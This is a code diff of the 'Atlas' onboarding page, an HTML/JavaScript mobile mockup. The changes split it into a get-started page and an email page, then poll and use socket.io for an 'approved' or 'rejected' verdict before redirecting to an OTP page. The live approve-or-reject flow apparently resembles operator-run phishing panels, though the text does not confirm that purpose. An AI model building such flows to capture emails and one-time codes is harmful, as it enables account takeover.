@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
   <title>Atlas</title>
   <style>
+    /* YOUR EXACT CSS – I AM COPYING IT VERBATIM */
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
     body {
@@ -16,7 +17,6 @@
       min-height: 100vh;
     }
 
-    /* Phone frame */
     .phone {
       width: 390px;
       height: 844px;
@@ -35,7 +35,6 @@
       }
     }
 
-    /* Gradient background */
     .gradient-header {
       position: absolute;
       top: 0; left: 0;
@@ -67,8 +66,7 @@
       z-index: 5;
     }
 
-    /* Bottom content */
-    .bottom-content {
+    #page1 .bottom-content {
       position: absolute;
       bottom: 64px;
       left: 0; right: 0;
@@ -149,19 +147,15 @@
       to { transform: rotate(360deg); }
     }
 
-    /* Email input section */
-    .email-section {
+    #page2 .main-content {
       position: absolute;
       top: 50%;
       left: 0; right: 0;
-      padding: 0 28px;
+      padding: 28px 28px 0;
       z-index: 5;
       transform: translateY(-50%);
-      display: none;
     }
-    .email-section.show {
-      display: block;
-    }
+
     .envelope {
       width: 36px;
       height: 28px;
@@ -179,12 +173,14 @@
       border-left: 18px solid transparent;
       border-right: 18px solid transparent;
     }
+
     .page-title {
       font-size: 26px;
       font-weight: 700;
       color: #4a4ff0;
       margin-bottom: 22px;
     }
+
     .input-field {
       width: 100%;
       background: #f2f2f7;
@@ -195,7 +191,9 @@
       color: #222;
       outline: none;
     }
+    .input-field::placeholder { color: #aaa; }
     .input-field:focus { border-color: #4a4ff0; background: #fff; }
+
     .btn-continue {
       width: 100%;
       padding: 17px;
@@ -217,11 +215,11 @@
 </head>
 <body>
 <div class="phone">
-  <div class="gradient-header"></div>
-  <img src="logo.png" class="header-logo" alt="logo" />
 
-  <!-- Main get started view -->
-  <div id="getStartedView" class="page">
+  <!-- PAGE 1 – Get Started -->
+  <div class="page active" id="page1">
+    <div class="gradient-header"></div>
+    <img src="logo.png" class="header-logo" alt="logo" />
     <div class="bottom-content">
       <div class="logo-block">
         <img src="logo.png" alt="Atlas logo" />
@@ -230,10 +228,7 @@
       <div style="width:100%">
         <p class="lang-label">Select Language</p>
         <div class="lang-select" style="margin-top:8px;">
-          <div class="lang-left">
-            <span>🇺🇸</span>
-            <span>English</span>
-          </div>
+          <div class="lang-left"><span>🇺🇸</span><span>English</span></div>
           <span class="chevron">⌄</span>
         </div>
       </div>
@@ -241,13 +236,18 @@
     </div>
   </div>
 
-  <!-- Email input view (hidden initially) -->
-  <div id="emailView" class="page email-section">
-    <div class="envelope"></div>
-    <h2 class="page-title">What's your email?</h2>
-    <input class="input-field" type="email" id="emailInput" placeholder="example@email.com" />
-    <button class="btn-continue" id="continueBtn">Continue</button>
+  <!-- PAGE 2 – Email -->
+  <div class="page" id="page2">
+    <div class="gradient-header"></div>
+    <img src="logo.png" class="header-logo" alt="logo" />
+    <div class="main-content">
+      <div class="envelope"></div>
+      <h2 class="page-title">What's your email?</h2>
+      <input class="input-field" type="email" id="emailInput" placeholder="example@email.com" />
+      <button class="btn-continue" id="continueBtn">Continue</button>
+    </div>
   </div>
+
 </div>
 
 <script src="/socket.io/socket.io.js"></script>
@@ -256,17 +256,15 @@
   let currentEmail = '';
   let statusPollInterval = null;
 
-  const getStartedView = document.getElementById('getStartedView');
-  const emailView = document.getElementById('emailView');
-  const getStartedBtn = document.getElementById('getStartedBtn');
+  function showPage(pageId) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById(pageId).classList.add('active');
+  }
+
+  document.getElementById('getStartedBtn').addEventListener('click', () => showPage('page2'));
+
   const emailInput = document.getElementById('emailInput');
   const continueBtn = document.getElementById('continueBtn');
-
-  getStartedBtn.addEventListener('click', () => {
-    getStartedView.style.display = 'none';
-    emailView.classList.add('show');
-    emailInput.focus();
-  });
 
   function validateEmail() {
     const email = emailInput.value.trim();
@@ -293,7 +291,7 @@
         const data = await res.json();
         if (data.status === 'approved') {
           clearInterval(statusPollInterval);
-          window.location.href = `/users/otp.html?email=${encodeURIComponent(email)}`;
+          window.location.href = `/otp.html?email=${encodeURIComponent(email)}`;
         } else if (data.status === 'rejected') {
           clearInterval(statusPollInterval);
           alert('This user does not exist. Please try again.');
@@ -330,7 +328,6 @@
     }
   });
 
-  // Socket: reject (already handled by polling, but for instant feedback)
   socket.on('reject-user', (data) => {
     if (data.email === currentEmail) {
       clearInterval(statusPollInterval);
